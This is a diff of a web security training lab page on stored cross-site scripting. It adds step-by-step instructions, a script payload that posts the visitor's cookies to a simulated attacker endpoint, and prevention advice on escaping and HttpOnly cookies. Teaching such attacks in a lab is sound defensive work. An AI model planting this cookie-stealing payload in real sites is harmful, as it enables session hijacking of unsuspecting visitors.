@@ -8,6 +8,7 @@
         <link rel="stylesheet" href="/styles/xss.css">
         <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
         <script src="/api/xss_fade.js"></script>
+        <script src="/api/xss_stored_frame.js"></script>
     </head>
     <body class="body">
         <div class="page-wrapper">
@@ -43,41 +44,87 @@
                         <P>
                             In this lab, you will make permanent changes to the lab environment. If you want to reset the lab environment, click the button below:
                         </p>
-                        <button id='reset-button' class="button" type="button">Reset</button>
-
+                        <button id='reset-button' class="button reverse" type="button">Reset</button>
+                        <section id='reset-button-sec'>
+                            <p id="usr-created-note" class="note" style="display:none"></p>
+                            <button class="good" id="reset-hide-button" style="display:none" onclick="resetNotesClose()"></button>
+                        </section>
                         <div>
                             <ul>
                                 <li class="fadeMe" id="li_1">
-                                    Open the vulnerable page in a new tab.
                                     <p>
-                                         L
+                                        Examine the vulnerable page. It contains a form that allows you to post a comment.
+                                        What can this form be used for?
+
                                     </p> 
                                     <button class="reverse" onclick="fade(0)"> Next </button>
                                 </li>
-                                <li class="fadeMe", id="li_2">
-                                    <code>
+                                <li class="fadeMe" id="li_2" hidden>
+                                    <p>
+                                        Enter the following code snippet as a comment to the vulnerable page.
+                                        If the page is vulnerable, then this code will be embedded in the page and 
+                                        executed everytime someone visits the page. After a while you will
+                                        see the cookie value in the attacker page.
+                                    </p>
+                                    <p>
+                                        The code will extract the cookies from the victim's browser and send them to the attacker's server.
+                                        Attcker's server is simulated by the lower iframe.
+                                    </p>
+                                    <code id="post-code">
 &lt;script&gt;
-fetch('<%- full_url %>/frame_attacker', {
+fetch(
+'<%- full_url %>/frame_attacker',
+{
     method: 'POST',
     body: JSON.stringify(document.cookie)
 });
 &lt;/script&gt;
-                                    </code>
+                                    </code><br/>
+                                    <!-- <button onclick="copyCode()">Copy code to clipboard</button> -->
+                                    <button class="reverse" onclick="fade(1)"> Next </button>
+                                </li>
+                                <li class="fadeMe" id="li_3" hidden>
+                                    <h3>Prevention</h3>
+                                    <ul>
+                                        <li>
+                                            Properly validate all user input. Use correct escaping. Program
+                                            your own solution or use a framework that automatically escapes all user input.
+                                        </li>
+                                        <li>
+                                            On a server side - use the correct security parameters for cookies.
+                                            Using the <code>HttpOnly</code> flag will prevent the cookie from being accessed by JavaScript and this
+                                            attack will not work. Also take a look at the other flags that can be used.
+
+                                        </li>
+                                        <li>
+                                            Learn more here:
+                                            <br/><a href="https://owasp.org/www-community/attacks/xss/">OWASP XSS</a>
+                                            <br/><a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a>
+                                            <br/><a href="https://portswigger.net/web-security/cross-site-scripting/stored">Port Swigger Labs</a>
+                                            <br/><a href="https://portswigger.net/web-security/cross-site-scripting/preventing">Port Swigger XSS Prevention</a>
+                                            <br/>
+                                        </li>
+                                    </ul>
+                                    <br/>
+                                    <button class="reverse" onclick="fade(2)"> Return to start </button>
                                 </li>
                             </ul>
                         </div>
                     </div>
                     <div class="xss-stored-wrapper-right">
                         <p>
-                            Vulnerable page: <%- full_url %>/frame
+                            Vulnerable page: <code><%- full_url %>/frame</code>
                         </p>
                         <div class="example-frame-cls">
                             <iframe src="/xss_stored/frame" frameborder="0"></iframe>
                         </div>
                         <p>
-                            Attacker page: <%- full_url %>/frame_attacker
+                            Attacker page: <code><%- full_url %>/frame_attacker</code>
+                            (refreshed every 5 seconds)
                         </p>
-                        <iframe id="attacker-frame" src="/xss_stored/frame_attacker" frameborder="0"></iframe>
+                        <div>
+                            <iframe id="attacker-frame" src="/xss_stored/frame_attacker" frameborder="0"></iframe>
+                        </div>
                     </div>
                 </div>
             </main>
